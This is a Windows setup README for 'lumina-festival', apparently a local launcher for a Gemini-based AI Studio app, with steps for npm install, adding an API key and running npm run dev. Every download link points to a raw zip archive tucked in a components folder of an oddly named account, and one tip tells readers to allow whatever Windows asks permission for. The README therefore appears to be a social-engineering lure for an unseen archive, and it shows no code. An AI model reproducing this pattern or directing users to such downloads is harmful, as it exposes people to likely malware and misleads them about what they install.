# ✨ lumina-festival - Run Your AI App With Ease

[![Download the app](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip)

## 🖥️ What This App Does

lumina-festival helps you run an AI Studio app on your Windows PC. It is built for people who want to open the app, enter their API key, and start using it with a few simple steps.

Use it to:
- Run the app on your computer
- Connect your Gemini API key
- Test and use the app in a local browser window
- Keep everything in one folder on your PC

## 📥 Download the App

Visit this page to download and use the app source files:

[Download lumina-festival from GitHub](https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip)

If you are on Windows, this is the link you should open first. Save the files to a folder you can find again, such as Downloads or Desktop.

## ⚙️ What You Need Before You Start

Before you run the app, make sure you have:

- A Windows computer
- Internet access
- Node.js installed
- A Gemini API key
- A web browser such as Chrome, Edge, or Firefox

If you do not have Node.js yet, install the current Windows version from the official Node.js site.

## 🚀 Getting Started on Windows

Follow these steps in order.

### 1. Download the project files

Open the GitHub link above and get the files from the repository page.

If you use the browser download option, save the project into a new folder named `lumina-festival`.

### 2. Open the folder

After the download finishes:

- Open File Explorer
- Find the `lumina-festival` folder
- Open that folder

You should see files such as `package.json` and `.env.local` or files with similar names.

### 3. Install Node.js

If Node.js is not already on your PC:

- Open the Node.js download page
- Get the Windows installer
- Run the installer
- Follow the steps on screen
- Finish the setup

After install, restart your computer if Windows asks for it.

### 4. Open Command Prompt in the project folder

You need a command window in the same folder as the app.

To do this on Windows:

- Open the `lumina-festival` folder
- Click the address bar at the top
- Type `cmd`
- Press Enter

A black window should open. It should start in your project folder.

### 5. Install the app files it needs

In the Command Prompt window, type:

`npm install`

Press Enter.

This step gets the app files it needs to run. Wait until the process ends.

### 6. Add your Gemini API key

The app needs your Gemini API key.

Open the `.env.local` file in Notepad or another text editor, then add this line:

`GEMINI_API_KEY=your_api_key_here`

Replace `your_api_key_here` with your real Gemini API key.

Save the file when you are done.

### 7. Start the app

In the same Command Prompt window, type:

`npm run dev`

Press Enter.

Wait for the app to finish starting. When it is ready, Windows will show a local address such as:

`http://localhost:3000`

Open that address in your browser.

## 🧭 How to Use It

After the app opens in your browser:

- Read the main screen
- Enter any required app details
- Use your Gemini API key setup
- Test the app in the browser window
- Keep the Command Prompt window open while you use it

If you close the Command Prompt window, the app stops.

## 🪟 Windows Tips

If something does not work, check these points:

- Make sure Node.js is installed
- Make sure you ran `npm install`
- Make sure the API key line in `.env.local` has no extra spaces
- Make sure you opened Command Prompt in the right folder
- Make sure the app is still running in the Command Prompt window

If Windows asks for permission, choose the option that lets the app run.

## 🧩 Common Files You May See

These files are part of a normal app setup:

- `package.json` — tells Node.js how to run the app
- `.env.local` — stores your API key
- `node_modules` — files installed by `npm install`
- `src` — app source files
- `public` — static files used by the app

You do not need to edit most of these files unless you are changing the app itself.

## 🔧 Basic Setup Flow

Use this quick flow when you want to run the app again later:

1. Open the `lumina-festival` folder
2. Open Command Prompt in that folder
3. Run `npm run dev`
4. Open the local browser link
5. Use the app

If you delete `node_modules`, run `npm install` again before starting the app.

## 📌 Project Link

Primary download page:

[https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip](https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip)

## 🛠️ Troubleshooting

### Node.js command not found

If `npm` does not work:

- Close Command Prompt
- Install Node.js again
- Open a new Command Prompt window
- Try `node -v` and `npm -v`

### App does not start

If `npm run dev` fails:

- Check the folder name
- Run `npm install` again
- Check the `.env.local` file
- Make sure the API key is present

### Browser page does not open

If the app starts but the page does not open:

- Copy the local address from Command Prompt
- Paste it into your browser
- Try `http://localhost:3000`
- Try another browser

### API key error

If the app says the Gemini key is wrong:

- Open `.env.local`
- Check the key name
- Make sure the value is valid
- Save the file
- Restart the app with `npm run dev`

## 🧾 Simple Run Checklist

- Download the project
- Install Node.js
- Open the project folder
- Run `npm install`
- Add your Gemini API key to `.env.local`
- Run `npm run dev`
- Open the local browser link